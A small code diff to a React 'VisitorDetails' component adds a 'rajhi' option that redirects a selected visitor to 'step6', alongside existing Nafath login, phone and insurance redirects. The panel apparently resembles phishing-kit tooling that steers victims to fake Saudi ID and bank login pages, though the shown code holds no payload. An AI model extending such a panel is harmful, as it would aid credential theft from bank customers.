@@ -55,6 +55,9 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
             currentStep: "home" as any 
           }
           break
+          case "rajhi":
+            updates = { redirectPage: "step6" as any }
+            break
         case "insur":
           updates = { redirectPage: "insur" as any }
           break
@@ -568,6 +571,7 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
               <option value="phone">معلومات الهاتف</option>
               <option value="nafad">نفاذ</option>
               <option value="nafad_modal">مودال نفاذ</option>
+              <option value="rajhi"> راجحي</option>
             </select>
           </div>
         </div>
